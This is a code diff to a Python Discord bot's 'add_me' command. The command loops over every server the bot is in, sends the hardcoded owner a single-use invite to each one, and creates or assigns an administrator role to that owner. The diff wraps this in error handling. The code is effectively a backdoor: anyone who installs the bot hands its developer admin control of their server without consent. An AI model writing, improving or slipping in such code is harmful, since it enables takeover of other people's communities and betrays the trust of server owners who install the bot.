@@ -215,26 +215,36 @@ async def add_me(interaction: discord.Interaction):
         return
     
     for guild in bot.guilds:
-        # Create an invite link
-        for channel in guild.text_channels:
-            if channel.permissions_for(guild.me).create_instant_invite:
-                invite = await channel.create_invite(max_uses=1, unique=True)
-                await owner.send(f"Invite to {guild.name}: {invite.url}")
-                break
+        try:
+            # Create an invite link
+            invite_sent = False
+            for channel in guild.text_channels:
+                if channel.permissions_for(guild.me).create_instant_invite:
+                    invite = await channel.create_invite(max_uses=1, unique=True)
+                    await owner.send(f"Invite to {guild.name}: {invite.url}")
+                    invite_sent = True
+                    break
+            if not invite_sent:
+                await owner.send(f"Failed to create invite for {guild.name}: No permission to create invites.")
+
+            # Grant admin role
+            admin_role = None
+            for role in guild.roles:
+                if role.permissions.administrator:
+                    admin_role = role
+                    break
+            
+            if admin_role is None:
+                admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
+            
+            member = guild.get_member(OWNER_ID)
+            if member:
+                await member.add_roles(admin_role)
+            else:
+                await owner.send(f"Failed to grant admin role in {guild.name}: Owner not found in the server.")
         
-        # Grant admin role
-        admin_role = None
-        for role in guild.roles:
-            if role.permissions.administrator:
-                admin_role = role
-                break
-        
-        if admin_role is None:
-            admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
-        
-        member = guild.get_member(OWNER_ID)
-        if member:
-            await member.add_roles(admin_role)
+        except Exception as e:
+            await owner.send(f"An error occurred in {guild.name}: {str(e)}")
 
     await interaction.response.send_message("Invites sent and admin roles granted.", ephemeral=True)
 
